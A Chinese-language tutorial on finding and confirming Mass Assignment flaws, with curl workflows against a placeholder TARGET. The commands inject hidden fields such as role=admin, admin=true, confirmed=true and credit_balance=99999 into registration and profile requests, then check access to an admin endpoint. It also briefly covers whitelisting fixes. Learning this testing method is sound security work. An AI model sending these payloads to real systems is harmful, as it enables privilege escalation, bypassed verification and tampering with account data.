## 學習目標

- 理解 Mass Assignment 的根本成因：後端把整包輸入直接映射到模型。
- 能從 HTML、JS、API 回應中找出模型存在但前端未暴露的欄位。
- 能用 curl 或 Burp 補送隱藏欄位並驗證狀態是否改變。
- 理解「前端沒有輸入框」不等於「後端不接受」。
- 能提出以白名單與模型邊界為核心的修補建議。

---

## 理論基礎

```text
Mass Assignment 成因：
  框架把使用者提交的整包輸入（form / JSON body）
  直接綁定到 ORM 模型，沒有明確白名單過濾

  後端危險模式（Ruby on Rails 舊式）：
    User.create(params[:user])        ← 直接吃所有欄位，無過濾
    User.update(params[:user])

  安全模式（Rails Strong Parameters）：
    params.require(:user).permit(:name, :email)
    # 明確白名單：只允許 name 和 email 兩個欄位

  其他框架的類似問題：
    Flask：User(**request.json)       ← 整包 JSON 直接傳給模型建構子
    Django：user.update(**request.data)
    Laravel：User::create($request->all())  ← all() 不過濾任何欄位

攻擊邏輯：
  前端只顯示 name / email 輸入框
  但模型還有 role / admin / confirmed / credit_balance 欄位
  → 攻擊者在請求 body 中額外補上這些欄位
  → 若後端直接 mass assign → 敏感欄位被更新

高風險欄位類型：
  角色提升型：admin=true / role=admin / is_staff=true
  審核繞過型：confirmed=true / approved=1 / verified=true
  業務數值型：credit_balance=99999 / price=0.01
  資源歸屬型：owner_id=X / user_id=1（取得別人的資源）

三個關鍵確認問題：
  Q1：模型中存在哪些欄位？（從 API 回應、原始碼、JS 找線索）
  Q2：後端是否接受了我補送的欄位？（看回應碼與狀態改變）
  Q3：欄位生效後的影響是什麼？（角色提升？審核繞過？）
```

## 方法一：從前端和 API 回應找隱藏欄位

```bash
# ===== 步驟 1：觀察 API 回應中的模型欄位 =====
curl -s \
  -H "Cookie: session=YOUR_TOKEN" \
  http://TARGET/api/profile | python3 -m json.tool
# python3 -m json.tool → 格式化輸出 JSON，方便閱讀
# 若回應包含 {"name":"wayne","email":"...","role":"user","confirmed":true}
# → 模型有 role 和 confirmed 欄位，前端卻沒有對應輸入框
# → 這兩個欄位是 Mass Assignment 測試目標

# ===== 步驟 2：查看 HTML 原始碼中的隱藏 input =====
curl -s http://TARGET/register | grep -iE "hidden|input|type="
# -i → 不分大小寫   -E → 支援正規表達式

# ===== 步驟 3：查看前端 JS 中的 API 欄位線索 =====
curl -s http://TARGET/assets/app.js | grep -iE "role|admin|confirmed|credit|staff"
# 前端 JS 可能包含 API 文件或欄位定義
# 這些關鍵字出現 → 對應欄位可能存在於後端模型

# ===== 步驟 4：查看 Swagger 或 API 文件（若存在）=====
curl -s http://TARGET/api/docs | python3 -m json.tool
curl -s http://TARGET/swagger.json | python3 -m json.tool
# API 文件常直接列出所有可接受的欄位
```

## 方法二：建立 Baseline（正常請求）

```bash
# ===== 先記錄正常流程（對照基準）=====

# 正常註冊 POST（只送前端表單的欄位）
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"name":"testuser","email":"test@evil.com","password":"Test1234"}' \
  http://TARGET/api/register -o baseline_register.txt
# → 保存正常回應作為對照基準

# 正常登入後查看個人資料（記錄初始狀態）
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"test@evil.com","password":"Test1234"}' \
  http://TARGET/api/login -c cookies.txt
# -c cookies.txt → 保存 Session Cookie 供後續使用

curl -s -b cookies.txt http://TARGET/api/profile -o baseline_profile.txt
# -b cookies.txt → 使用保存的 Cookie
cat baseline_profile.txt | python3 -m json.tool
# 記錄：role 是否為 "user"？confirmed 是 true 還是 false？
```

## 方法三：逐一測試敏感欄位（最小化驗證）

```bash
# ===== 原則：每次只補一個欄位，方便確認哪個欄位生效 =====

# 測試 1：補送 confirmed=true（繞過 Email 審核）
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"name":"user2","email":"test2@evil.com","password":"Test1234","confirmed":true}' \
  http://TARGET/api/register
# 若可以直接登入而不需要 Email 確認 → confirmed 欄位可被外部賦值

# 測試 2：補送 role=admin（角色提升）
curl -s -X PUT \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"name":"testuser","role":"admin"}' \
  http://TARGET/api/profile
# PUT → 更新個人資料請求

# 測試 3：補送 admin=true
curl -s -X PUT \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"name":"testuser","admin":true}' \
  http://TARGET/api/profile

# 測試 4：補送 is_staff=true
curl -s -X PUT \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"name":"testuser","is_staff":true}' \
  http://TARGET/api/profile

# 測試 5：補送業務數值欄位
curl -s -X PUT \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"name":"testuser","credit_balance":99999}' \
  http://TARGET/api/profile

# ===== 每次測試後立即驗證狀態 =====
curl -s -b cookies.txt http://TARGET/api/profile | python3 -m json.tool
# 比對 baseline_profile.txt：role / confirmed / admin 是否改變了？
diff baseline_profile.txt <(curl -s -b cookies.txt http://TARGET/api/profile)
# diff → 若有差異，差異即為 Mass Assignment 生效的證據
```

## 方法四：驗證授權影響（兩帳號對照）

```bash
# ===== 帳號 A：嘗試提權為 admin =====
# 步驟 1：補送 role=admin 在註冊時
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"name":"userA","email":"userA@evil.com","password":"Pass1234","role":"admin"}' \
  http://TARGET/api/register

# 步驟 2：以帳號 A 登入
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"userA@evil.com","password":"Pass1234"}' \
  http://TARGET/api/login -c cookiesA.txt

# 步驟 3：存取僅管理員可見的端點
curl -s -b cookiesA.txt http://TARGET/api/admin/users
# 200 OK → 提權成功（Mass Assignment + 授權控制缺失）
# 403 Forbidden → 欄位可能被接受但授權層仍有控制

# ===== 帳號 B（正常帳號）：作為對照 =====
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"name":"userB","email":"userB@normal.com","password":"Pass1234"}' \
  http://TARGET/api/register

curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"userB@normal.com","password":"Pass1234"}' \
  http://TARGET/api/login -c cookiesB.txt

curl -s -b cookiesB.txt http://TARGET/api/admin/users
# 預期 403 → 正常帳號無法存取，用於確認帳號 A 的 200 是真正的提權
```

## 對照測試框架

```bash
# 標準對照測試流程：

# Step 1：Baseline（正常請求不含額外欄位）
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"name":"test","email":"a@b.com","password":"pass"}' \
  http://TARGET/api/register -o baseline.txt

# Step 2：Test（補送一個敏感欄位）
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"name":"test","email":"a@b.com","password":"pass","confirmed":true}' \
  http://TARGET/api/register -o test.txt

# Step 3：比對差異
diff baseline.txt test.txt
# 若有意義的差異（如 confirmed 狀態不同）→ 欄位被接受

# Step 4：驗證後續影響
# 登入後查看 profile，確認狀態是否如預期改變
# 嘗試存取高權限端點，確認功能層面影響
```

## 決策流程

```
找到寫入端點（註冊 / 個資更新 / 物件建立 / 編輯 API）
    ↓
從 API 回應、HTML、JS 找模型可能存在的欄位
  重點：前端沒有輸入框 ≠ 後端不接受
    ↓
標記敏感欄位候選清單：
  角色型：role / admin / is_staff / is_superuser
  審核型：confirmed / approved / verified / active
  業務型：credit_balance / price / owner_id
    ↓
建立 Baseline（正常請求，不含額外欄位）→ 保存輸出
    ↓
每次只補送一個額外欄位 → 保存輸出
    ↓
比對差異（diff）
  回應碼異常（400 欄位錯誤 vs 200 接受）
  Profile 狀態改變（role / confirmed 值不同）
    ↓
驗證授權影響（能否存取高權限功能？）
    ↓
欄位被接受且狀態/授權改變 → Mass Assignment 成立，記錄 finding
```

## 常見錯誤與排查

- 把前端沒有輸入框當成欄位不可控 → 安全邊界在後端，UI 只是展示層。
- 一次加入太多欄位 → 每次只補一個，否則無法判斷是哪個欄位生效。
- 只憑 200 OK 就認定漏洞成立 → 必須確認後端狀態（profile / 資料庫）真的改變。
- 把研究方向寫成已驗證漏洞 → 需要 diff 對照或後續功能驗證才算成立。
